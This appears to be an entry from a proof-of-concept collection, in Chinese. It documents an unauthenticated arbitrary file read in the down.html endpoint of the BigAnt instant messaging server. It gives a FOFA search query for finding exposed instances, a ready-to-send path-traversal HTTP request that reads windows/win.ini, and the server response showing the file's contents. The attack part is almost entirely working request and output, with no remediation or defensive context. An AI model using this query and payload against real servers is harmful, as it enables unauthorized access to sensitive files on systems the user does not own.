## 杭州九麒科技-大蚂蚁即时通讯-down.html-任意文件读取漏洞

## 一、漏洞简介
杭州九麒科技 大蚂蚁即时通讯 down.html 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。

## fofa
```
(body="/Public/static/admin/admin_common.js" && body="/Public/lang/en.js") || body="BigAnt-Admin"
```

## POC
```
GET /Api/Update/down.html?file=../../../../../../windows/win.ini HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```

## POC
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Disposition: filename=win.ini
Content-Type: application/octet-stream
Date: Tue, 06-Jan-2026 06:37:07 GMT
Expires: Thu, 19-Nov-1981 08:52:00 GMT
Pragma: no-cache
Server: Apache/2.4.33 (Win32) OpenSSL/1.0.2o PHP/5.6.36
Set-Cookie: PHPSESSID=b7ht1o5m1hacucga5rmsfmqss0; path=/
X-Powered-By: PHP/5.6.36
Content-Length: 92

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
